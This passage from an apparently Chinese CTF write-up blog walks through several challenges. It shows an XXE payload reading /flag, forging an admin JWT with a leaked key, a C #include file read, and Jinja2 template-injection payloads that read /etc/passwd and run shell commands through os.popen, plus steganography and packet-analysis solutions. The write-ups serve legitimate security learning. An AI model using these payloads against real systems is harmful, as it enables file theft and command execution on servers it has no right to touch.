operator">:</span> Call<span class="token operator">&lt;</span>CommentResponse<span class="token operator">></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>最下面的是一个POST的数据，应该是在request body里面上传的数据需要，然后上传的数据的键值对在上面已经import过了，看上面的import的文件<br><code>import com.arconsultoria.cars.domain.Comment</code><br>将<code>.</code>换成<code>/</code>找到文件<code>com/arconsultoria/cars/domain/Comment.kt</code>其中的内容如下:<br><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">package</span> com<span class="token punctuation">.</span>arconsultoria<span class="token punctuation">.</span>cars<span class="token punctuation">.</span>domain<span class="token keyword">data</span> <span class="token keyword">class</span> <span class="token function">Comment</span><span class="token punctuation">(</span>    <span class="token keyword">var</span> name<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">var</span> message<span class="token operator">:</span> String<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可见有两个字段，可以上传json数据先试试水。<br><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;comment HTTP&#x2F;1.1Host: fd673db5-233d-4567-ba6b-65c0a44cd875.node3.buuoj.cnUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko&#x2F;20100101 Firefox&#x2F;84.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeContent-Length: 44Content-Type:application&#x2F;jsonContent-Length: 44&#123;&quot;name&quot;: &quot;Test Comment&quot;,&quot;message&quot;: &quot;Hello!&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可以返回，然后改成xml实现xxe。<br><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;comment HTTP&#x2F;1.1Host: fd673db5-233d-4567-ba6b-65c0a44cd875.node3.buuoj.cnUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko&#x2F;20100101 Firefox&#x2F;84.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeContent-Length: 53Content-Type:application&#x2F;xmlContent-Length: 53&lt;test&gt;&lt;name&gt;1&lt;&#x2F;name&gt;&lt;message&gt;2&lt;&#x2F;message&gt;&lt;&#x2F;test&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>xml测试也可以，直接上xxe的一般payload。<br><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;comment HTTP&#x2F;1.1Host: fd673db5-233d-4567-ba6b-65c0a44cd875.node3.buuoj.cnUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko&#x2F;20100101 Firefox&#x2F;84.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeContent-Length: 218Content-Type:application&#x2F;xmlContent-Length: 218&lt;?xml  version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;      &lt;!ENTITY xxe SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;Comment&gt;    &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;    &lt;message&gt;flag please!&lt;&#x2F;message&gt;&lt;&#x2F;Comment&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h5><p>一般的xxe的payload<br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>      &lt;!ENTITY xxe SYSTEM  "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Comment</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>flag please!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得flag</p><p><code>flag&#123;0e51772b-9ed8-446a-a2de-0776c0692533&#125;</code></p><p><strong>目前为止，buu上的所有fireshell的web题目都复现完了</strong></p><blockquote><p>小丑竟是我自己</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019-ImgXweb</title>
      <link href="2020/12/07/RootersCTF2019-ImgXweb/"/>
      <url>2020/12/07/RootersCTF2019-ImgXweb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-芜湖，身份伪造，-脑洞"><a href="#1-芜湖，身份伪造，-脑洞" class="headerlink" title="1.芜湖，身份伪造，+脑洞"></a>1.芜湖，身份伪造，+脑洞</h2><p>1.需要注册登录，直接先注册一个账号，然后使用注册的账号进行登录，可以上传文件，上传php文件，但是解析不了。<br>2.扫目录，呜呜，有<code>robots.txt</code>文件，内容如下<code>Disallow: /static/secretkey.txt</code>。<br>3.访问提示<code>Disallow: /static/secretkey.txt</code>得<code>you-will-never-guess</code>。<br>4.抓包，看到<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTExMSJ9.11KovmFggafMdmrs-Nre6A7kCc0SZZTw-srfpFBTMd4</code>，神似JWT，就是JWT，<a href="jwt.io">jwt.io</a><br>5.开始我的身份为我注册的账户名<code>1111</code>，改为<code>admin</code>，以<code>you-will-never-guess</code>为密钥，得<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.g_lGU4qTO2VhNrZK9k460xz828GcqKBayZPcmLmhUqE</code><br>6.伪造身份登陆后，发现<code>flag.png</code>，直接访问不行得不到数据，保存到桌面用记事本打开即可<code>flag&#123;573cec8d-716f-48d4-9f48-57fc470e8fa6&#125;</code><br><img src="/2020/12/07/RootersCTF2019-ImgXweb/1.png" alt="这这这"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FireshellCTF2020-Caas</title>
      <link href="2020/12/07/FireshellCTF2020-Caas/"/>
      <url>2020/12/07/FireshellCTF2020-Caas/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="用到了c里面的一个-include-“-“预处理命令"><a href="#用到了c里面的一个-include-“-“预处理命令" class="headerlink" title="用到了c里面的一个#include “ “预处理命令"></a>用到了c里面的一个#include “ “预处理命令</h2><p>利用头文件会爆出错误，直接输入<code>#include &quot;/flag&quot;</code>就行了，大佬们太强了。<br><code>flag&#123;203e1ecc-1264-417a-ac41-af7671e7800d&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc-sqltest</title>
      <link href="2020/12/07/misc-sqltest/"/>
      <url>2020/12/07/misc-sqltest/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h2><pre class="line-numbers language-none"><code class="language-none">网站遭受到攻击了，还好我们获取到了全部网络流量。 链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1AdQXVGKb6rkzqMLkSnGGBQ 提取码: 34uu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h2><p>很明显可以看出是正常的sql盲注的流量，导出http对象。~暂停一下，睡觉~</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019华东南赛区-Double_Secret</title>
      <link href="2020/12/07/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
      <url>2020/12/07/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0-用到的链接"><a href="#0-用到的链接" class="headerlink" title="0.用到的链接"></a>0.用到的链接</h2><p><a href="https://blog.csdn.net/csdn_pade/article/details/88566032">Flask/Jinja2模板注入中的一些绕过姿势</a></p><h2 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h2><p>1.首先访问<a href="http://bbe7494e-16e0-459c-a71c-83f246a9a3f1.node3.buuoj.cn/">主页面</a>看到信息<code>Welcome To Find Secret</code>。<br>2.然后进入页面<code>http://bbe7494e-16e0-459c-a71c-83f246a9a3f1.node3.buuoj.cn/secret</code>得到信息<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>。加密信息？<br>3.输入杂乱的信息<code>http://bbe7494e-16e0-459c-a71c-83f246a9a3f1.node3.buuoj.cn/secret?secret=dawfaef</code>出现flask报错。<br>4.flask报错内容如下:(并且报错可以看到python版本为2.7)<br><code>File &quot;/app/app.py&quot;, line 35, in secret</code><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">    <span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>    rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">)</span>   <span class="token comment">#解密</span>    deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>     a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span> Open an interactive python shell <span class="token keyword">in</span> this frame    <span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'flag detected!'</span>    <span class="token keyword">return</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>经过rc4解密(有密钥)后进行模版渲染，考虑模版注入漏洞</p><h2 id="2-模版注入"><a href="#2-模版注入" class="headerlink" title="2.模版注入"></a>2.模版注入</h2><p><code>用得RC4加密的脚本</code>昨天做一道misc题目的时候恰巧用到了这个rc4加密，当时是在线上的网站上面解的密。。。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token string">"init_key"</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print("RC4加密主函数")</span>    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  crypt<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span>    <span class="token comment"># print("原来的 s 盒：%s" % s_box)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment"># print("混乱后的 s 盒：%s"% s_box)</span>    <span class="token keyword">return</span> s_box<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print("调用加密程序成功。")</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print("res用于加密字符串，加密后是：%res" %res)</span>    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的字符串是：%s"</span> <span class="token operator">%</span>quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print("加密后的输出(经过编码):")</span>    <span class="token comment">#print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rc4_main<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">,</span><span class="token string">"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/12/07/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/1.png" alt>这里用的注入payload是<code>&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">读文件：  &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()执行命令：&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</code><br>然后直接GET传参吧<code>/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</code></p><h2 id="3-flag"><a href="#3-flag" class="headerlink" title="3.flag"></a>3.flag</h2><p><code>&#39;class&#39; is not allowed. Secret is flag&#123;f20771b3-5571-48ca-b2c5-f467c2c21857&#125;</code><br><code>flag&#123;f20771b3-5571-48ca-b2c5-f467c2c21857&#125;</code></p><p>注:只有这个payload可以用<code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code>，太菜了。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Jinja2模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-misc</title>
      <link href="2020/12/07/buuctf-misc/"/>
      <url>2020/12/07/buuctf-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>并非从第一题开始的</strong></p><h2 id="001-刷新过的图片"><a href="#001-刷新过的图片" class="headerlink" title="001.刷新过的图片"></a>001.刷新过的图片</h2><p><strong>F5隐写，使用工具F5-Steganography或者进行解密</strong><br>先打开kali命令行。<br><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;gitee.com&#x2F;erkymh&#x2F;F5-steganography#粘贴文件到该目录下java Extract Misc.jpg#分离处的output.txt挪到windows下面改后缀为.zip伪加密&#96;14 00 01 00&#96;这个地方把01改为00即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p><h2 id="002-snake"><a href="#002-snake" class="headerlink" title="002.snake"></a>002.snake</h2><pre class="line-numbers language-none"><code class="language-none">#binwalk分离一下，分出三个文件，分别看一下。一个key，一个cipher。key的内容是个base64，解一下码。What is Nicki Minaj&#39;s favorite song that refers to snakes?翻译一下为妮琪·米娜最喜欢的一首提到蛇的歌是什么？查到了这个&#96;Anaconda&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后怎么解密呢？沃日，SERPENT加密，SERPENT也是蛇的意思，这脑洞我真的服。。。<br><a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a>在线解密，选择文件，输入密钥<code>Anaconda</code>解密即可<br><pre class="line-numbers language-none"><code class="language-none">CTF&#123;who_knew_serpent_cipher_existed&#125;flag&#123;who_knew_serpent_cipher_existed&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="003-BJDCTF-2nd-圣火昭昭-y1ng"><a href="#003-BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="003.[BJDCTF 2nd]圣火昭昭-y1ng"></a>003.[BJDCTF 2nd]圣火昭昭-y1ng</h2><p><code>解题步骤</code><br><pre class="line-numbers language-none"><code class="language-none">图片用记事本打开之后也没有什么特别之处，那就试一下用stegsolve打开，也没发现啥。查看图片属性发现提示&#96;新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如&#96;解密后为&#96;gemlovecom&#96;。新佛曰解密网站&#96;http:&#x2F;&#x2F;hi.pcmoe.net&#x2F;buddha.html&#96;。然后因为题目的&#96;猜&#96;字加重了，所以可能是&#96;outguess&#96;加密，啊这，不愧是脑洞。##使用下面的命令解密outguess -k &quot;gemlove&quot; -r sheng_huo_zhao_zhao.jpg flag.txtBJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;flag&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><code>outguess工具使用方法</code><br><pre class="line-numbers language-none"><code class="language-none">####先下载git clone https:&#x2F;&#x2F;gitee.com&#x2F;bxqtee&#x2F;outguess####再安装.&#x2F;configure &amp;&amp; make &amp;&amp; make install 加密：outguess -k &quot;my secret key&quot; -d hidden.txt demo.jpg out.jpg加密之后，demo.jpg会覆盖out.jpg, hidden.txt中的内容是要隐藏的东西解密：outguess -k &quot;my secret key&quot; -r out.jpg hidden.txt解密之后，解密内容放在hidden.txt中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="004-梅花香之苦寒来"><a href="#004-梅花香之苦寒来" class="headerlink" title="004.梅花香之苦寒来"></a>004.梅花香之苦寒来</h2><pre class="line-numbers language-none"><code class="language-none">##查看属性提示·会画图吗？·  还有  ·图穷flag见·，不知道怎么搞记事本打开之后在文件的末尾发现大量的hex数据，可以直接用网站转为字符串。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://zixuephp.net/tool-str-hex.html">在线的网站HEX转为字符串</a><br>是大量的坐标，画图。<br>先去掉括号，本来想用脚本，但是既然vc可以直接替换成空格，那就省事了也。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pylab <span class="token keyword">as</span> pltx<span class="token punctuation">,</span> y <span class="token operator">=</span> np<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">'./坐标.txt'</span><span class="token punctuation">,</span> delimiter<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">,</span> unpack<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>获得二维码，扫过二维码之后获得flag<br><code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</code></p><h2 id="005-菜刀666"><a href="#005-菜刀666" class="headerlink" title="005.菜刀666"></a>005.菜刀666</h2><pre class="line-numbers language-none"><code class="language-none">##打开是个流量分析，用wireshark打开既然是菜刀666，那就找到上传的文件的地方，有upload&#x2F;1.php的那里然后选择追踪到第7个TCP流&lt;tcp.stream eq 7&gt;。然后发现下面的两个参数z1和z2，z1很短，值如下RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc%3D，然后解BASE64后的值如下&#96;D:\wamp64\www\upload\6666.jpg&#96;，估计后面的z2的值就是这张图片的内容了吧(开头为FF D8典型的jpg文件格式)。直接复制粘贴到winhex里面去保存为1.jpg即可。内容识别一下是&#96;Th1s_1s_p4sswd_!!!&#96;，继续向后追踪tcp流。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/12/07/buuctf-misc/1.jpg" alt><br><img src="/2020/12/07/buuctf-misc/2.jpg" alt><br><pre class="line-numbers language-none"><code class="language-none">追踪到流9的时候发现了仔细观察最下面的东西发现应该是一个加密的压缩包的内容，内容如下。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-none"><code class="language-none">-&gt;|PK...........KQ...4...(.......flag.txtC......cS...J..Ea.v....&amp;e$K..2%..$..,..&#x3D;.J..1p..p46.PK..?..........KQ...4...(.....$....... .......flag.txt. .........J. ..p...o2.p...o2.p..PK..........Z...Z.....well,you need passwd!.|&lt;-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>额，直接把整个流量包拉到kali里面，binwalk -e 666666.pcapng分离出压缩包之后拉到windows里面解压(zip后缀名的是我们需要的压缩包)，直接复制到win解压，密码为刚才图片上的密码。<br><code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code></p><h2 id="006-认真你就输了"><a href="#006-认真你就输了" class="headerlink" 